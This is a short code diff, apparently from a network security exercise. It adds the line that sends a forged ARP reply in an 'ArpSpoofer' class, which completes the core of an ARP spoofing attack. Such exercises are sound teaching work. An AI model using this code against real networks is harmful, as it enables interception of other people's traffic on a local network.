@@ -72,6 +72,7 @@ class ArpSpoofer(object):
         # Your code here...
 
         arp_response = scapy.ARP(op=2, pdst = DOOFENSHMIRTZ_IP, hwdst = self.get_target_mac(), psrc = self.spoof_ip)
+        scapy.send(arp_response, verbose=0)
         self.spoof_count += 1
 
     def run(self) -> None:
